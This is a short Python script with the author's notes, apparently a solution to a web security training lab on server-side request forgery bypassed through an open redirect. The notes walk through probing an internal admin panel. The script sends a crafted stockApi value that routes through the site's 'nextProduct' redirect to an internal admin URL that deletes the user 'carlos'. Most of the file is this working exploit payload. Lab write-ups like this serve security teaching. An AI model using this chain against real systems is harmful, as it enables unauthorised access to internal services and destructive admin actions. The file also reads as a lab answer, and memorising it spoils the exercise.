import requests as r 
from time import sleep 

# Lab: SSRF with filter bypass via open redirection vulnerability


link ="" #/product/stock

# http://192.168.0.12:8080/admin


# we probably have a request like 
# http://internal +  path from client ex:  http://internal/product/stock/check?productId=1&storeId=1

# maybe we can play with url-fragment
# http://internal/#

# http://internal/my-account => ok
# http://internal/ => ok
# http://internal/admin => nop probably blacklist
# ==> rabbit hole

# we have a link in the page which can be use to redirect  (maybe use the same path)
# <a href="/product/nextProduct?currentProductId=3&amp;path=/product?productId=4">| Next product</a>
myreq = r.post(link , data={"stockApi":"/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos"})

response = myreq.text 
print(response)